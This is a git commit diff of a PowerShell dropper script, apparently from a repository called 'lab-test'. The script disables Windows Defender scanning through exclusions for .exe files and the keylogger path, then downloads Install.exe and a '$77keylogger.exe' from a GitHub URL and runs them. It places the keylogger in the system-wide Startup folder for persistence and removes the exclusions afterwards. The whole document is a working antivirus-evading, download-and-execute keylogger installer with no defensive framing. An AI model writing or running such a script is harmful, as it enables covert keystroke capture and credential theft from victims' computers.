a385625665125079d24b4e1c55551bce7d079c94
polar313fs-byte <polar313fs@gmail.com>
2026-06-02 07:29:12 +0100

    Changed to system-wide startup folder

--- startScript.ps1
+++ startScript.ps1
@@ -1,7 +1,9 @@
-Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
+Invoke-WebRequest https://raw.githubusercontent.com/polar313fs-byte/lab-test/main/Install.exe -O Install.exe
+Start-Process Install.exe -Wait
+Set-Location "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 Invoke-WebRequest https://raw.githubusercontent.com/polar313fs-byte/lab-test/main/$77keylogger.exe -O $77keylogger.exe #Download keylogger script
-Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\$77keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`$77keylogger.exe" -Force #Add exception for keylogger.exe file in antivirus
 Start-Process $77keylogger.exe #Start $77keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
